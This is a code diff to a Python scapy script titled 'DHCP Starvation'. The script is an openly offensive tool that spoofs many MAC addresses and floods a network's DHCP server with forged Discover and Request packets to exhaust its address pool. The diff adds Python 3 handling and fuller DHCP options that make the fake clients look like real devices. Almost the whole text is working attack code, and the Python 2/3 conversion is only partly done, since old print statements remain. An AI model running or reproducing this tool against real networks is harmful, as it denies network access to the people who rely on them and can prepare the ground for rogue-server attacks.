@@ -11,6 +11,7 @@ from scapy.layers.l2 import Ether
 from scapy.layers.inet import UDP, IP
 from scapy.layers.dhcp import DHCP, BOOTP
 import datetime
+import platform
 
 # To stop scapy from checking return packet originating from any packet that we have sent out
 conf.checkIPaddr=False
@@ -30,11 +31,11 @@ broadcast_mac = 'ff:ff:ff:ff:ff:ff'
 letters = string.ascii_lowercase
 
 # Header
-print '###[ DHCP Starvation ]###'
-print '###[ Version 0.3 ]###'
-print '###[ Date 18/11/2019 ]###'
-print '###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###'
-print ''
+print ('###[ DHCP Starvation ]###')
+print ('###[ Version 0.3 ]###')
+print ('###[ Date 18/11/2019 ]###')
+print ('###[ by Bruno Botelho - bruno.botelho.br@gmail.com ]###')
+print ('')
 
 def log_timestamp():
     return colored(datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"), 'grey')
@@ -58,13 +59,25 @@ def up_temp_interface(j, mac):
 def down_temp_interface(j):
     os.system('ifconfig '+ temp_interface + ':' + str(j) + ' down')
 
-def dhcp_discovery (my_mac,j):
+def mac_to_hex(mac):
+    if '3.' in platform.python_version():
+        return binascii.unhexlify(mac.replace(':',''))
+    else:
+        return mac.replace(':', '').decode('hex')
+
+def dhcp_discovery (my_mac,j,hostname):
     # Craft DHCP Discover
     ethernet = Ether(src=my_mac,dst=broadcast_mac)
     ip = IP(src="0.0.0.0", dst='255.255.255.255')
     udp = UDP(sport=68,dport=67)
-    bootp = BOOTP(chaddr=my_mac,xid = RandInt())
-    dhcp = DHCP(options=[('message-type', 'discover'), 'end'])
+    bootp = BOOTP(chaddr=mac_to_hex(my_mac),xid = RandInt())
+    dhcp = DHCP(options=[('message-type', 'discover'),
+    ('param_req_list',[1, 121, 3, 6, 15, 119, 252, 44, 46]),
+    ('max_dhcp_size', 1500),
+    ('client_id', mac_to_hex(my_mac)),
+    ('lease_time', 43200),
+    ('hostname', hostname),
+    'end'])
     dhcp_discover_packet = ethernet / ip / udp / bootp / dhcp
     #print dhcp_discover_packet.summary()
     #print dhcp_discover_packet.display()
@@ -80,7 +93,7 @@ def dhcp_atack(j):
     up_temp_interface(j,temp_mac)
     #DISCOVERY
     print '###[ '+ log_timestamp() + ' Discover with MAC ' + temp_mac + ' ]###'
-    dhcp_offer = dhcp_discovery(temp_mac, j)
+    dhcp_offer = dhcp_discovery(temp_mac, j, hostname)
     #OFFER
     #print dhcp_offer.summary()
     #print dhcp_offer.display()
@@ -90,7 +103,7 @@ def dhcp_atack(j):
     ethernet = Ether(src=temp_mac, dst=broadcast_mac)
     ip = IP(src='0.0.0.0', dst='255.255.255.255')
     udp = UDP(sport=68, dport=67)
-    bootp = BOOTP(chaddr=temp_mac,xid = RandInt())
+    bootp = BOOTP(chaddr=mac_to_hex(temp_mac),xid = RandInt())
     dhcp = DHCP(options=[('message-type','request'),
         ('server_id', dhcp_offer[IP].src),
         ('client_id', str2mac(raw_temp_mac)),
